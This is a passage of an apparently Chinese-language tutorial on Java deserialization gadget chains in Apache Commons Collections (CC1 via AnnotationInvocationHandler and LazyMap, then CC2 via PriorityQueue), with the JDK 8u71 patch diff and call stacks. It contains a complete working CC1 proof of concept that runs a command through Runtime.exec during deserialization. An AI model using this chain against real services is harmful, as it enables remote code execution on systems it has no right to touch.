<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">transform:122, ChainedTransformer (org.apache.commons.collections.functors)</span><br><span class="line">checkSetValue:204, TransformedMap (org.apache.commons.collections.map)</span><br><span class="line">setValue:192, AbstractInputCheckedMapDecorator$MapEntry (org.apache.commons.collections.map)</span><br><span class="line">readObject:356, AnnotationInvocationHandler (sun.reflect.annotation)</span><br><span class="line">...</span><br><span class="line">main:36, CommonsCollections1 (com.example)</span><br></pre></td></tr></table></figure></div>

<p>在 8u71 以后大概是 2015 年 12 月的时候，Java 官方<a class="link"   target="_blank" rel="noopener" href="https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/f8a528d0379d" >修改<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>了 <code>sun.reflect.annotation.AnnotationInvocationHandler</code> 的 <code>readObject</code> 函数。新版的 <code>readObject</code> 不再操作 <code>memberValues</code> 而是操作 <code>Map&lt;String, Object&gt; streamVals = (Map&lt;String, Object&gt;)fields.get(&quot;memberValues&quot;, null)</code> ，因此 CC1 失效。</p>
<div class="code-container" data-rel="Diff"><figure class="iseeu highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--- a/src/share/classes/sun/reflect/annotation/AnnotationInvocationHandler.java	Tue Dec 01 08:58:28 2015 -0500</span></span><br><span class="line"><span class="comment">+++ b/src/share/classes/sun/reflect/annotation/AnnotationInvocationHandler.java	Tue Dec 01 22:38:16 2015 +0000</span></span><br><span class="line"><span class="meta">@@ -25,6 +25,7 @@</span></span><br><span class="line"> </span><br><span class="line"> package sun.reflect.annotation;</span><br><span class="line"> </span><br><span class="line"><span class="addition">+import java.io.ObjectInputStream;</span></span><br><span class="line"> import java.lang.annotation.*;</span><br><span class="line"> import java.lang.reflect.*;</span><br><span class="line"> import java.io.Serializable;</span><br><span class="line"><span class="meta">@@ -425,35 +426,72 @@</span></span><br><span class="line"> </span><br><span class="line">     private void readObject(java.io.ObjectInputStream s)</span><br><span class="line">         throws java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line"><span class="deletion">-        s.defaultReadObject();</span></span><br><span class="line"><span class="addition">+        ObjectInputStream.GetField fields = s.readFields();</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+        @SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line"><span class="addition">+        Class&lt;? extends Annotation&gt; t = (Class&lt;? extends Annotation&gt;)fields.get(&quot;type&quot;, null);</span></span><br><span class="line"><span class="addition">+        @SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line"><span class="addition">+        Map&lt;String, Object&gt; streamVals = (Map&lt;String, Object&gt;)fields.get(&quot;memberValues&quot;, null);</span></span><br><span class="line"> </span><br><span class="line">         // Check to make sure that types have not evolved incompatibly</span><br><span class="line"> </span><br><span class="line">         AnnotationType annotationType = null;</span><br><span class="line">         try &#123;</span><br><span class="line"><span class="deletion">-            annotationType = AnnotationType.getInstance(type);</span></span><br><span class="line"><span class="addition">+            annotationType = AnnotationType.getInstance(t);</span></span><br><span class="line">         &#125; catch(IllegalArgumentException e) &#123;</span><br><span class="line">             // Class is no longer an annotation type; time to punch out</span><br><span class="line">             throw new java.io.InvalidObjectException(&quot;Non-annotation type in annotation serial stream&quot;);</span><br><span class="line">         &#125;</span><br><span class="line"> </span><br><span class="line">         Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line"><span class="addition">+        // consistent with runtime Map type</span></span><br><span class="line"><span class="addition">+        Map&lt;String, Object&gt; mv = new LinkedHashMap&lt;&gt;();</span></span><br><span class="line"> </span><br><span class="line">         // If there are annotation members without values, that</span><br><span class="line">         // situation is handled by the invoke method.</span><br><span class="line"><span class="deletion">-        for (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span></span><br><span class="line"><span class="addition">+        for (Map.Entry&lt;String, Object&gt; memberValue : streamVals.entrySet()) &#123;</span></span><br><span class="line">             String name = memberValue.getKey();</span><br><span class="line"><span class="addition">+            Object value = null;</span></span><br><span class="line">             Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">             if (memberType != null) &#123;  // i.e. member still exists</span><br><span class="line"><span class="deletion">-                Object value = memberValue.getValue();</span></span><br><span class="line"><span class="addition">+                value = memberValue.getValue();</span></span><br><span class="line">                 if (!(memberType.isInstance(value) ||</span><br><span class="line">                       value instanceof ExceptionProxy)) &#123;</span><br><span class="line"><span class="deletion">-                    memberValue.setValue(</span></span><br><span class="line"><span class="deletion">-                        new AnnotationTypeMismatchExceptionProxy(</span></span><br><span class="line"><span class="addition">+                    value = new AnnotationTypeMismatchExceptionProxy(</span></span><br><span class="line">                             value.getClass() + &quot;[&quot; + value + &quot;]&quot;).setMember(</span><br><span class="line"><span class="deletion">-                                annotationType.members().get(name)));</span></span><br><span class="line"><span class="addition">+                                annotationType.members().get(name));</span></span><br><span class="line">                 &#125;</span><br><span class="line">             &#125;</span><br><span class="line"><span class="addition">+            mv.put(name, value);</span></span><br><span class="line"><span class="addition">+        &#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+        UnsafeAccessor.setType(this, t);</span></span><br><span class="line"><span class="addition">+        UnsafeAccessor.setMemberValues(this, mv);</span></span><br><span class="line"><span class="addition">+    &#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+    private static class UnsafeAccessor &#123;</span></span><br><span class="line"><span class="addition">+        private static final sun.misc.Unsafe unsafe;</span></span><br><span class="line"><span class="addition">+        private static final long typeOffset;</span></span><br><span class="line"><span class="addition">+        private static final long memberValuesOffset;</span></span><br><span class="line"><span class="addition">+        static &#123;</span></span><br><span class="line"><span class="addition">+            try &#123;</span></span><br><span class="line"><span class="addition">+                unsafe = sun.misc.Unsafe.getUnsafe();</span></span><br><span class="line"><span class="addition">+                typeOffset = unsafe.objectFieldOffset</span></span><br><span class="line"><span class="addition">+                        (AnnotationInvocationHandler.class.getDeclaredField(&quot;type&quot;));</span></span><br><span class="line"><span class="addition">+                memberValuesOffset = unsafe.objectFieldOffset</span></span><br><span class="line"><span class="addition">+                        (AnnotationInvocationHandler.class.getDeclaredField(&quot;memberValues&quot;));</span></span><br><span class="line"><span class="addition">+            &#125; catch (Exception ex) &#123;</span></span><br><span class="line"><span class="addition">+                throw new ExceptionInInitializerError(ex);</span></span><br><span class="line"><span class="addition">+            &#125;</span></span><br><span class="line"><span class="addition">+        &#125;</span></span><br><span class="line"><span class="addition">+        static void setType(AnnotationInvocationHandler o,</span></span><br><span class="line"><span class="addition">+                            Class&lt;? extends Annotation&gt; type) &#123;</span></span><br><span class="line"><span class="addition">+            unsafe.putObject(o, typeOffset, type);</span></span><br><span class="line"><span class="addition">+        &#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+        static void setMemberValues(AnnotationInvocationHandler o,</span></span><br><span class="line"><span class="addition">+                                    Map&lt;String, Object&gt; memberValues) &#123;</span></span><br><span class="line"><span class="addition">+            unsafe.putObject(o, memberValuesOffset, memberValues);</span></span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="CommonsCollections1（AnnotationInvocationHandler→LazyMap）"><a href="#CommonsCollections1（AnnotationInvocationHandler→LazyMap）" class="headerlink" title="CommonsCollections1（AnnotationInvocationHandler→LazyMap）"></a>CommonsCollections1（AnnotationInvocationHandler→LazyMap）</h3><p>前面提到过，<code>LazyMap</code> 修饰过的 <code>Map</code> 只要调用 <code>get</code> 方法就会触发 <code>transform</code> 方法。然而 <code>AnnotationInvocationHandler.readObject</code> 并没有调用 <code>get</code> 方法。</p>
<p>不过幸运的是 <code>AnnotationInvocationHandler</code> 实现了 <code>InvocationHandler</code> 接口，因此 <code>AnnotationInvocationHandler</code> 本身是一个动态代理接口对象。也就是说只要我们把一个 <code>Map</code> 用 <code>AnnotationInvocationHandler</code> 代理，那么代理后的 <code>Map</code> 的任何方法调用都会执行到 <code>AnnotationInvocationHandler</code> 的 <code>invoke</code> 方法。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) construct.newInstance(Retention.class, outerMap);</span><br><span class="line"><span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, handler);</span><br></pre></td></tr></table></figure></div>

<p><code>AnnotationInvocationHandler</code> 的 <code>invoke</code> 方法特判几种方法后会调用 <code>memberValues</code> 的 <code>get</code> 方法，也就会触发 <code>LazyMap</code> 的 <code>transform</code> 方法调用。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">member</span> <span class="operator">=</span> method.getName(); <span class="comment">// 获取方法的名称</span></span><br><span class="line">    Class&lt;?&gt;[] paramTypes = method.getParameterTypes(); <span class="comment">// 获取方法的参数类型</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 处理 Object 和 Annotation 的方法</span></span><br><span class="line">    <span class="keyword">if</span> (member.equals(<span class="string">&quot;equals&quot;</span>) &amp;&amp; paramTypes.length == <span class="number">1</span> &amp;&amp;</span><br><span class="line">        paramTypes[<span class="number">0</span>] == Object.class)</span><br><span class="line">        <span class="keyword">return</span> equalsImpl(args[<span class="number">0</span>]); <span class="comment">// 调用自定义的 equals 实现</span></span><br><span class="line">    <span class="keyword">if</span> (paramTypes.length != <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AssertionError</span>(<span class="string">&quot;Too many parameters for an annotation method&quot;</span>); <span class="comment">// 如果参数不为0，抛出断言错误</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span>(member) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;toString&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> toStringImpl(); <span class="comment">// 调用自定义的 toString 实现</span></span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;hashCode&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> hashCodeImpl(); <span class="comment">// 调用自定义的 hashCode 实现</span></span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;annotationType&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> type; <span class="comment">// 返回注解的类型</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 处理注解成员的访问器</span></span><br><span class="line">    <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> memberValues.get(member); <span class="comment">// 从 memberValues 中获取对应成员的值，这里调用了 get 方法。</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (result == <span class="literal">null</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IncompleteAnnotationException</span>(type, member); <span class="comment">// 如果结果为null，抛出不完整注解异常</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (result <span class="keyword">instanceof</span> ExceptionProxy)</span><br><span class="line">        <span class="keyword">throw</span> ((ExceptionProxy) result).generateException(); <span class="comment">// 如果结果是异常代理，生成并抛出异常</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (result.getClass().isArray() &amp;&amp; Array.getLength(result) != <span class="number">0</span>)</span><br><span class="line">        result = cloneArray(result); <span class="comment">// 如果结果是非空数组，拷贝一份数组</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result; <span class="comment">// 返回最终的结果</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>完整 poc 如下，需要注意的是代理之后任何对 <code>proxyMap</code> 的操作都会触发 <code>transformer</code> 调用，因此需要最后设置恶意的 <code>Transformer</code>。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections1</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) construct.newInstance(Retention.class, outerMap);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, handler);</span><br><span class="line"></span><br><span class="line">        handler = (InvocationHandler) construct.newInstance(Retention.class, proxyMap);</span><br><span class="line">        </span><br><span class="line">        setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(handler);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>调用栈如下：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">transform:122, ChainedTransformer (org.apache.commons.collections.functors)</span><br><span class="line">get:158, LazyMap (org.apache.commons.collections.map)</span><br><span class="line">invoke:69, AnnotationInvocationHandler (sun.reflect.annotation)</span><br><span class="line">entrySet:-1, $Proxy1 (com.sun.proxy) 内层 AnnotationInvocationHandler 代理的 Map</span><br><span class="line">readObject:349, AnnotationInvocationHandler (sun.reflect.annotation)</span><br><span class="line">...</span><br><span class="line">main:42, CommonsCollections1 (com.example)</span><br></pre></td></tr></table></figure></div>

<h3 id="CommonsCollections2（PriorityQueue→TransformingComparator）"><a href="#CommonsCollections2（PriorityQueue→TransformingComparator）" class="headerlink" title="CommonsCollections2（PriorityQueue→TransformingComparator）"></a>CommonsCollections2（PriorityQueue→TransformingComparator）</h3><p>前面提到，<code>TransformingComparator</code> 在比较时会对比较的对象调用 <code>transform</code> 方法。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(Object obj1, Object obj2)</span> &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">value1</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj1);</span><br><span class="line">    <span class="type">Object</span> <span class="variable">value2</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj2);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.decorated.compare(value1, value2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>而 Java 中内置的维护顺序的容器如 <code>PriorityQueue</code> 在反序列化时会对内部的元素进行排序，这个过程中在 <code>siftDownUsingComparator</code> 函数内涉及了元素大小的比较。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftDownUsingComparator</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">half</span> <span class="operator">=</span> size &gt;&gt;&gt; <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (k &lt; half) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">child</span> <span class="operator">=</span> (k &lt;&lt; <span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">c</span> <span class="operator">=</span> queue[child];</span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> child + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (right &lt; size &amp;&amp;</span><br><span class="line">            comparator.compare((E) c, (E) queue[right]) &gt; <span class="number">0</span>)</span><br><span class="line">            c = queue[child = right];</span><br><span class="line">        <span class="keyword">if</span> (comparator.compare(x, (E) c) &lt;= <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        queue[k] = c;</span><br><span class="line">        k = child;</span><br><span class="line">    &#125;</span><br><span class="line">    queue[k] = x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftDown</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (comparator != <span class="literal">null</span>)</span><br><span class="line">        siftDownUsingComparator(k, x);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        siftDownComparable(k, x);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">heapify</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> (size &gt;&gt;&gt; <span class="number">1</span>) - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">        siftDown(i, (E) queue[i]);</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="comment">// Read in size, and any hidden stuff</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in (and discard) array length</span></span><br><span class="line">    s.readInt();</span><br><span class="line"></span><br><span class="line">    queue = <span class="keyword">new</span> <span class="title class_">Object</span>[size];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in all elements.</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">        queue[i] = s.readObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Elements are guaranteed to be in &quot;proper order&quot;, but the</span></span><br><span class="line">    <span class="comment">// spec has never explained what that might be.</span></span><br><span class="line">    heapify();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>因此我们只需要在创建 <code>PriorityQueue</code> 容器时指定比较对象为我们定义的 <code>TransformingComparator</code>，之后往 <code>PriorityQueue</code> 中随便放两个元素，那么在反序列化时就会调用 <code>comparator.compare</code> 方法触发 <code>transform</code> 方法调用。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Comparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformerChain);</span><br><span class="line"><span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>,comparator);</span><br></pre></td></tr></table></figure></div>

<p>poc 如下：</p>
